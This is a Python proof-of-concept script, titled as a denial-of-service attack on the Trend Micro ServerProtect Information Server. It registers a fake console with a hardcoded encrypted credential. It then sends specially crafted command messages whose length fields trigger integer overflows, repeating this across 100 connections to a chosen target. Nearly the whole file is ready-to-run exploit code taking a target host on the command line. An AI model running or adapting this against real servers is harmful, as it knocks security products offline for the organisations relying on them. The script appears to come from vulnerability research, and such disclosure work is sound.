import sys, socket, argparse, hexdump, os
from struct import *

def dump(title, data):
  if debug and data:
    print('[--- %s ---]' % (title))
    hexdump.hexdump(data)

def recvall(sock, n):
  data = bytearray(b'')
  while len(data) < n:
      packet = sock.recv(n - len(data))
      if not packet:
          return None
      data += packet
  return data

def recv_msg(sock):
  data = bytearray(b'')

  # Read header
  data = recvall(sock, 0x1C)
  
  # Get msg size 
  size = unpack_from('<I', data, 0x10)[0]

  if size < 0x1C or size > 0x800000:
    raise ValueError('Invalid msg size {}'.format(size))

  # Get data 
  data += recvall(sock, size - 0x1C)

  if len(data) != size:
    raise ValueError('Failed to read msg of {} bytes'.format(size))

  return bytes(data)

def read_msg(sock, key=None):
  r = dict()
  msg = recv_msg(sock)

  r['magic']  = unpack_from('<I', msg, 0)[0]
  r['cmd']    = unpack_from('<I', msg, 4)[0]
  r['err']    = unpack_from('<I', msg, 8)[0]

  dump('command {} response'.format(r['cmd']), msg)

  if len(msg) > 0x1C:
    data = msg[0x1C:]
  else:
    data = b'' 

  r['data'] = data
  return r

def mk_msg(cmd, data, cport, scount=0):
  msg = pack('<IIIIIII', 
    magic,
    cmd,
    0,
    scount,
    0x1C + len(data),
    cport,
    0) + data
  return msg

#
# MAIN
#
descr = 'Trend Micro ServerProtect Information Server DoS'

parser = argparse.ArgumentParser(description=descr, formatter_class=argparse.RawTextHelpFormatter)
required = parser.add_argument_group('required arguments')
required.add_argument('-t', '--target',required=True, help='Target host')
#required.add_argument('-c', '--cmd',required=True, type=int, choices=[4098, 8221, 8222, 12308, 12309, 36885], help='command to send')
required.add_argument('-c', '--cmd',required=True, type=int, help='command to send')
parser.add_argument('-p', '--port', type=int, default=5005, help='ServerProtect Information Server port, default: %(default)s')
parser.add_argument('-d', '--debug', action='store_true', help='Dump command requests and responses')


args = parser.parse_args()
target = args.target
port = args.port
cmd = args.cmd
debug = args.debug

magic = 0x87654321

cport = 1000
data = pack('68s', os.path.basename(sys.argv[0]).encode()) 
data += pack('<II', cport, 1) 
data += '!CRYPT!1087C8A854BBE88D3E554736F39'.encode('utf_16_le')
data += b'\x00' * (0x150 - len(data))
data += pack('<HHHH', 0, 0, 0, 12)
data += b'\x00' * 8

reg = mk_msg(2, data, cport)

if cmd == 4098:
  data =  pack('<52sI', 'domain'.encode(), int(0x100000000 / 56))
  msg = mk_msg(cmd, data, cport)
elif cmd == 8221 or cmd == 8222:
  data = b'A' * 0x38  + pack('<II', 0, int(0x100000000 / 28 - 8)) + b'\xff' * (0x24 - 8)
  msg = mk_msg(cmd, data, cport, 1)
elif cmd == 8226:
  data = b'A' * 0x38 * 2 + pack('<I', int(0x100000000 / 4 - 4)) 
  msg = mk_msg(cmd, data, cport, 1)
elif cmd == 12308 or cmd == 12309:  
  data = b'A' * 0x38  + pack('<I', 0xffffffff)
  msg = mk_msg(cmd, data, cport, 1)
elif cmd == 36867:
  data = pack('<I', int(0x100000000 / 196))
  msg = mk_msg(cmd, data, cport)
elif cmd == 36869:
  data = b'A' * 0xC4 + pack('<I', int(0x100000000 / 56))
  msg = mk_msg(cmd, data, cport)
elif cmd == 36885:
  data = b'S' * 0x38  + b'A' * 0xC4 + pack('<I', int(0x100000000 - 0x760))
  msg = mk_msg(cmd, data, cport)
elif cmd == 36898:
  data = b'A' * 0x38  +  pack('<I', int(0x100000000 / 208))
  msg = mk_msg(cmd, data, cport)
elif cmd == 41010:
  data = pack('<I', int(0x100000000 / 740))
  msg = mk_msg(cmd, data, cport)
elif cmd == 41014:
  data = pack('<I', int(0x100000000 / 752))
  msg = mk_msg(cmd, data, cport)
elif cmd == 65549:
  data = b'A' * 0x38 + pack('<I', int(0x100000000 / 28 - 1))
  msg = mk_msg(cmd, data, cport)
else:
  sys.exit('Invalid command {}'.format(cmd))
  
    
for i in range(100):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  print('Connection {}'.format(i + 1))
  s.settimeout(5)
  s.connect((target, port))
  dump('command 2', reg)
  s.sendall(reg)

  r = read_msg(s)
  if r['magic'] != magic or r['cmd'] != 2 or r['err'] != 0:
    s.close()
    sys.exit('Failed to register a console.')

  print('Registered a client console OK')
  print('Sending a specially crafted command {} message'.format(cmd))
  dump('command {}'.format(cmd), msg)
  s.sendall(msg)
  s.close()

